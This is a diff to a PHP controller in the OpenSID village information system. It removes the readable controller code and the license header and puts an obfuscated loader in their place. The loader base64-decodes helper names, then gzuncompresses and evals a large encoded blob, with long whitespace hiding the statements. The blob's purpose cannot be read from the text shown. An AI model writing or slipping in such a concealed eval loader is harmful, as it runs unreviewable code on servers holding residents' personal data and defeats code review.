@@ -1,215 +1,713 @@
-<?php
+<?php 
+        $__='printf';$_='Loading Modules/Analisis/Http/Controllers/AnalisisPeriodeController.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-use Modules\Analisis\Enums\AnalisisRefStateEnum;
-use Modules\Analisis\Models\AnalisisMaster;
-use Modules\Analisis\Models\AnalisisPeriode;
-use Modules\Analisis\Models\AnalisisRespon;
-use Modules\Analisis\Models\AnalisisResponHasil;
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class AnalisisPeriodeController extends AdminModulController
-{
-    public $moduleName    = 'Analisis';
-    public $modul_ini     = 'analisis';
-    public $sub_modul_ini = 'analisis-periode';
-    protected $analisisMaster;
-    private $selectedMenu = 'Data Periode';
 
-    public function __construct()
-    {
-        parent::__construct();
-        isCan('b');
-        $master               = request()->segment(2);
-        $this->analisisMaster = AnalisisMaster::findOrFail($master);
-        view()->share([
-            'selectedMenu'    => $this->selectedMenu,
-            'analisis_master' => $this->analisisMaster,
-        ]);
-    }
 
-    protected static function validate(array $request = []): array
-    {
-        return [
-            'nama'              => htmlentities($request['nama']),
-            'id_state'          => bilangan($request['id_state']),
-            'aktif'             => bilangan($request['aktif']),
-            'keterangan'        => htmlentities($request['keterangan']),
-            'tahun_pelaksanaan' => bilangan($request['tahun_pelaksanaan']),
-        ];
-    }
 
-    public function index($master)
-    {
-        return view('analisis::periode.index');
-    }
 
-    public function datatables($master)
-    {
-        if (request()->ajax()) {
-            $canUpdate = can('u');
-            $canDelete = can('h');
 
-            return datatables()->of(AnalisisPeriode::whereIdMaster($master))
-                ->addColumn('ceklist', static function ($row) use ($canDelete) {
-                    if ($canDelete) {
-                        return '<input type="checkbox" name="id_cb[]" value="' . $row->id . '"/>';
-                    }
-                })
-                ->addIndexColumn()
-                ->addColumn('aksi', static function ($row) use ($canUpdate, $canDelete, $master): string {
-                    $aksi = '';
-                    if ($canUpdate) {
-                        $aksi .= '<a href="' . ci_route("analisis_periode.{$master}.form", $row->id) . '" class="btn bg-orange btn-sm"  title="Ubah Data"  data-remote="false" data-toggle="modal" data-target="#modalBox" data-title="Ubah Data"><i class="fa fa-edit"></i></a> ';
 
-                        if ($row->isLock()) {
-                            $aksi .= '<a href="' . ci_route("analisis_periode.{$master}.lock", $row->id) . '" class="btn bg-navy btn-sm"  title="Nonaktikan"><i class="fa fa-unlock"></i></a> ';
-                        } else {
-                            $aksi .= '<a href="' . ci_route("analisis_periode.{$master}.lock", $row->id) . '" class="btn bg-navy btn-sm"  title="Aktifkan"><i class="fa fa-lock"></i></a> ';
-                        }
-                    }
 
-                    if ($canDelete) {
-                        $aksi .= ' <a href="#" data-href="' . ci_route("analisis_periode.{$master}.delete", $row->id) . '" class="btn bg-maroon btn-sm"  title="Hapus Data" data-toggle="modal" data-target="#confirm-delete"><i class="fa fa-trash-o"></i></a> ';
-                    }
 
-                    return $aksi;
-                })
-                ->rawColumns(['ceklist', 'aksi'])
-                ->make();
-        }
 
-        return show_404();
-    }
 
-    public function form($master, $id = null)
-    {
-        isCan('u');
-        $data['tahapan'] = AnalisisRefStateEnum::all();
-        if ($id) {
-            $data['action']           = 'Ubah';
-            $data['form_action']      = ci_route('analisis_periode.' . $master . '.update', $id);
-            $data['analisis_periode'] = AnalisisPeriode::findOrFail($id);
-        } else {
-            $data['action']           = 'Tambah';
-            $data['form_action']      = ci_route('analisis_periode.' . $master . '.insert');
-            $data['analisis_periode'] = null;
-        }
 
-        return view('analisis::periode.form', $data);
-    }
 
-    public function insert($master): void
-    {
-        isCan('u');
-        $dataInsert              = static::validate($this->request);
-        $dataInsert['id_master'] = $master;
-        if ($result = AnalisisPeriode::create($dataInsert)) {
-            if ($this->request['duplikasi']) {
-                $this->duplikasi($master, $result->id, $this->request);
-            }
 
-            redirect_with('success', 'Berhasil Tambah Data', ci_route('analisis_periode.' . $master));
-        }
 
-        redirect_with('error', 'Gagal Tambah Data', ci_route('analisis_periode.' . $master));
-    }
 
-    public function update($master, $id = null): void
-    {
-        isCan('u');
-        $dataUpdate = static::validate($this->request, $id);
-        $data       = AnalisisPeriode::findOrFail($id);
 
-        if ($data->update($dataUpdate)) {
-            redirect_with('success', 'Berhasil Ubah Data', ci_route('analisis_periode.' . $master));
-        }
 
-        redirect_with('error', 'Gagal Ubah Data', ci_route('analisis_periode.' . $master));
-    }
 
-    public function lock($master, $id = null): void
-    {
-        isCan('u');
 
-        if (AnalisisPeriode::gantiStatus($id, 'aktif')) {
-            redirect_with('success', 'Berhasil Ubah Data', ci_route('analisis_periode.' . $master));
-        }
 
-        redirect_with('error', 'Gagal Ubah Data', ci_route('analisis_periode.' . $master));
-    }
 
-    public function delete($master, $id = null): void
-    {
-        isCan('h');
 
-        if (AnalisisPeriode::destroy($id ?? $this->request['id_cb']) !== 0) {
-            redirect_with('success', 'Berhasil Hapus Data', ci_route('analisis_periode.' . $master));
-        }
-        redirect_with('error', 'Gagal Hapus Data', ci_route('analisis_periode.' . $master));
-    }
 
-    private function duplikasi($idMaster, $idPeriode, $request): void
-    {
-        // Jika status aktif, maka nonaktifkan semua periode yang aktif lainnya pada master yang sama
-        if ($request['aktif'] == 1) {
-            AnalisisPeriode::where('id_master', $idMaster)->where('id', '!=', $idPeriode)->update(['aktif' => 0]);
-        }
 
-        if ($request['duplikasi'] == 1) {
-            $dpd = AnalisisPeriode::where('id_master', $idMaster)
-                ->where('id', '!=', $idPeriode)
-                ->orderBy('id', 'desc')
-                ->first();
-            $sblm = $dpd->id;
-            $skrg = $idPeriode;
 
-            $dataRespon = AnalisisRespon::where('id_periode', $sblm)
-                ->get(['id_subjek', 'id_indikator', 'id_parameter']);
 
-            if ($dataRespon->isNotEmpty()) {
-                $dataRespon->each(static function ($item) use ($skrg) {
-                    $item->id_periode = $skrg;
-                });
 
-                AnalisisRespon::insert($dataRespon->toArray());
-                AnalisisResponHasil::preUpdate($idMaster, $skrg);
-            }
-        }
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
